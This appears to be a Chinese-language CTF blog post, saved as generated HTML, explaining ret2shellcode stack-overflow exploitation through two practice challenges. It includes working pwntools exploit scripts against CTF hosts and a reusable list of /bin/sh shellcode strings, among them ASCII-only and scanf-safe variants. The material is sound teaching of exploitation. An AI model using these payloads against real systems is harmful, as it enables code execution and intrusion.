@@ -1,0 +1,941 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="The Redefine Team">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://incldue.github.io/2025/11/05/pwn练习之ret2shellcode/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN练习之ret2shellcode">
+<meta property="og:url" content="https://incldue.github.io/2025/11/05/PWN%E7%BB%83%E4%B9%A0%E4%B9%8Bret2shellcode/index.html">
+<meta property="og:site_name" content="D&#39;b8Gr的小站~">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale">
+<meta property="og:image" content="https://incldue.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-11-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-05T16:27:04.062Z">
+<meta property="article:author" content="debu8ger">
+<meta property="article:tag" content="CTF赛题">
+<meta property="article:tag" content="CTF基础知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://incldue.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="../../../../images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="../../../../images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            PWN练习之ret2shellcode | Theme Redefine
+        
+    </title>
+
+    
+<link rel="stylesheet" href="fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="../../../../css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"incldue.github.io","root":"/","language":"zh-Hans"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Theme Redefine
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="../../../../index.html"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="../../../../index.html"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">19</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">PWN练习之ret2shellcode</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="../../../../images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-11-05 00</span>
+        <span class="mobile">2025-11-05 00</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-11-06 00:27</span>
+            <span class="mobile">2025-11-06 00:27</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="../../../../categories/CTF%E7%9B%B8%E5%85%B3/">CTF相关</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="../../../../tags/CTF%E8%B5%9B%E9%A2%98/">CTF赛题</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="../../../../tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">CTF基础知识</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>ret2shellcode是栈溢出利用<code>ret2text</code>、<code>ret2shellcode</code>、<code>ret2libc</code>三大类中的一个，是指攻击者需要在程序没给shell的情况下自己调用<code>shell</code>的机器码(即<code>shellcode</code>)注入到程序内存中，随后就是利用栈溢出复写<code>return_address</code>，跳转至<code>shellcode所在内存</code>，执行shell命令，得到flag。</p>
+<h3 id="可能的exp姿势"><a href="#可能的exp姿势" class="headerlink" title="可能的exp姿势"></a>可能的exp姿势</h3><h4 id="1-注入shellcode至stack段中"><a href="#1-注入shellcode至stack段中" class="headerlink" title="1.注入shellcode至stack段中"></a>1.注入shellcode至stack段中</h4><p>这个现在其实很少见了，基本上都加了保护。其中，比较常见的保护手段有：</p>
+<ul>
+<li><strong>ASLR</strong>：其功能是将一部分内存段(如栈…)的地址<code>偏移</code>，在注入时难以定位其位置。</li>
+<li><strong>NX</strong>：使得部分内存段(如堆、栈…) <code>不可执行</code>，无法执行注入的代码。</li>
+<li><strong>Canary</strong>：原理是<code>在栈底插入cookie信息</code>，函数返回时将检测该信息<code>是否被改变</code>，若改变，则断定发生栈溢出</li>
+</ul>
+<h4 id="2-注入shellcode至bss段中"><a href="#2-注入shellcode至bss段中" class="headerlink" title="2.注入shellcode至bss段中"></a>2.注入shellcode至bss段中</h4><p>在虚拟内存当中，<code>bss段</code>主要保存无初值的全局变量&#x2F;静态变量(在assmbly中以<code>占位符？</code>声明)。若程序的bss段可写、可执行，则可以把shellcode写入全局变量&#x2F;静态变量中。</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="一-GDOUCTF-2023-Shellcode"><a href="#一-GDOUCTF-2023-Shellcode" class="headerlink" title="一.[GDOUCTF 2023]Shellcode"></a>一.[GDOUCTF 2023]Shellcode</h4><p>拿到二进制文件，习惯性的<code>checksec</code>一下，看栈…的保护措施：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/pwn1.png"
+                      alt="pwn1"
+                ></p>
+<p>加了<strong>NX</strong>，不过没啥关系，</p>
+<p>放到IDA中反编译，定位到<code>main函数</code>：</p>
+<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++">&#123;<br>  _BYTE buf[<span class="hljs-number">10</span>]; <span class="hljs-comment">// [rsp+6h] [rbp-Ah] BYREF</span><br><br>  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">mprotect</span>((<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> __int64)&amp;stdout &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000LL</span>), <span class="hljs-number">0x1000uLL</span>, <span class="hljs-number">7</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please.&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;name, <span class="hljs-number">0x25uLL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Nice to meet you.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s start!&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x40uLL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></div>
+
+<p>可以利用<code>name</code>来注入shellcode，然后再栈溢出到<code>buf</code>中执行。这里要注意的是<code>name</code>限制了<code>25字节</code>的写入。</p>
+<p>想到利用<code>pwntools</code>里的<code>shellcraft</code>模块直接生成<code>shellcode</code>利用，</p>
+<p>首先试试用<code>shellcraft.sh()</code>，但是这个在32位下占位44字节，64位的则为<code>48字节</code>，超过了25字节的写入限制。于是，便利用<code>shellcraft.cat()</code>来构造<code>cat flag</code>，这个只有0x21字节。</p>
+<p>接着，我们得到<code>name</code>的地址为<code>.bss段</code>的<code>0x6010A0</code>。</p>
+<p>最后的exp：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="hljs-number">28409</span>)<br><br>shellcode = asm(shellcraft.cat(<span class="hljs-string">&quot;flag&quot;</span>))<br>io.sendlineafter(<span class="hljs-string">b&#x27;Please.&#x27;</span>, shellcode)<br>io.sendlineafter(<span class="hljs-string">b&#x27;start!&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x12</span> + p64(<span class="hljs-number">0x6010A0</span>))<br><br>io.interactive()<br><br><span class="hljs-comment">#flag:NSSCTF&#123;d7640236-bc9b-4954-a10a-2bfd305e91a8&#125;</span><br></code></pre></td></tr></table></figure></div>
+
+<p>还有一种做法是<strong>手动构造shellcode</strong>，找一个小于25字节的shellcode。</p>
+<blockquote>
+<p>[NOTE]</p>
+<p>32位短字节shellcode(21字节)：</p>
+<p>\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</p>
+<p>64位短字节shellcode(23字节)：</p>
+<p>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f \x05</p>
+</blockquote>
+<p>其余的基本上不变，下面为第二种exp：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="hljs-number">28409</span>)<br>shellcode = <span class="hljs-string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br>io.sendlineafter(<span class="hljs-string">b&#x27;Please.&#x27;</span>, shellcode)<br>io.sendlineafter(<span class="hljs-string">b&#x27;start!&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x12</span> + p64(<span class="hljs-number">0x6010A0</span>))<br><br>io.interactive()<br><br><span class="hljs-comment">#flag:NSSCTF&#123;d7640236-bc9b-4954-a10a-2bfd305e91a8&#125;</span><br></code></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="二-HNCTF-2022-Week1-safe-shellcode"><a href="#二-HNCTF-2022-Week1-safe-shellcode" class="headerlink" title="二.[HNCTF 2022 Week1]safe_shellcode"></a>二.[HNCTF 2022 Week1]safe_shellcode</h4><p>拿到附件，<code>checksec</code>一下，</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/pwn2.png"
+                      alt="pwn2"
+                ></p>
+<p>保护得还算少，</p>
+<p>IDA中反编译，定位<code>main函数</code>：</p>
+<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++">&#123;<br>  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">524</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-220h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+20Ch] [rbp-14h]</span><br><br>  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">mprotect</span>((<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> __int64)&amp;stdout &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000LL</span>), <span class="hljs-number">0x1000uLL</span>, <span class="hljs-number">7</span>);<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x200uLL</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x300uLL</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    v3 = i;<br>    <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-built_in">strlen</span>(s) )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( s[i] &lt;= <span class="hljs-number">47</span> || s[i] &gt; <span class="hljs-number">122</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hacker!!!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>(buff, s);<br>  (*(<span class="hljs-built_in">void</span> (**)(<span class="hljs-type">void</span>))buff)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></div>
+
+<p>就是先<code>read</code>一下<code>s</code>变量，循环<code>s</code>字节数的次数做判断，<code>strcpy(buff, s)</code>则是将<code>s</code>的值直接存入<code>buff</code>中，其也指向了<code>.bss段</code>。</p>
+<p>要想绕过该判断，只要输入的ascii码在47-122之间即可。0<del>9、A</del>Z、a~z都可。</p>
+<p>我们使用<strong>纯ascii字符的shellcode</strong>：<code>Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</code></p>
+<p>因为后面直接调用了<code>buff</code>的地址，所以无须栈溢出即可得到flag。</p>
+<blockquote>
+<p>[NOTE]</p>
+<p> 32位 短字节shellcode –&gt; 21字节 \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80 </p>
+<p> 32位 纯ascii字符shellcode PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA </p>
+<p> 32位 scanf可读取的shellcode \xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff&#x2F;bin&#x2F;sh </p>
+<p> 64位 scanf可读取的shellcode 22字节 \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05 </p>
+<p> 64位 较短的shellcode  23字节 \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05 </p>
+<p> 64位 纯ascii字符shellcode Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t </p>
+</blockquote>
+<p>最后的exp：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="hljs-number">26988</span>)<br><br>shellcode = <span class="hljs-string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span><br>io.send(shellcode)<br>io.interactive()<br><br><span class="hljs-comment">#flag:nssctf&#123;W0www!!!!!!!!!!!Sh311C0d3_m@st3rrr!!&#125;</span><br></code></pre></td></tr></table></figure></div>
+
+
+
